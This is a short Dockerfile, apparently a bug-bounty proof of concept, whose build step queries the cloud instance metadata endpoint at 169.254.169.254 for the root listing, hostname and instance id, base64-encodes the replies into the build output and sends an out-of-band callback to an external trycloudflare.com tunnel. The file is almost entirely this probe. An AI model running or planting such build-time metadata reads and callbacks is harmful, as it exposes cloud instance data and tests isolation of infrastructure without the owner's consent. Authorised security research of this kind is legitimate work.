FROM python:3.11-slim
RUN apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*
RUN echo "=== IMDS HTTP PORT 80 TEST ===" && \
    curl -s -m 5 -o /tmp/imds_root.txt -w "HTTP_CODE:%{http_code} SIZE:%{size_download}" http://169.254.169.254/metadata/v1/ 2>&1 || echo "CURL_FAILED" && \
    echo "=== IMDS_ROOT_RESPONSE ===" && \
    cat /tmp/imds_root.txt 2>/dev/null | base64 || echo "NO_RESPONSE" && \
    echo "=== IMDS_HOSTNAME ===" && \
    curl -s -m 5 http://169.254.169.254/metadata/v1/hostname 2>&1 | base64 || echo "NO_HOSTNAME" && \
    echo "=== IMDS_ID ===" && \
    curl -s -m 5 http://169.254.169.254/metadata/v1/id 2>&1 | base64 || echo "NO_ID" && \
    echo "=== OOB_CALLBACK ===" && \
    curl -s -m 5 -H "X-BBP-Researcher: mrunal" "https://cheapest-vessel-hometown-equipped.trycloudflare.com/build-imds-test?result=reached" 2>&1 || echo "OOB_FAILED" && \
    echo "=== END IMDS TEST ==="
RUN echo "done" > /dev/null
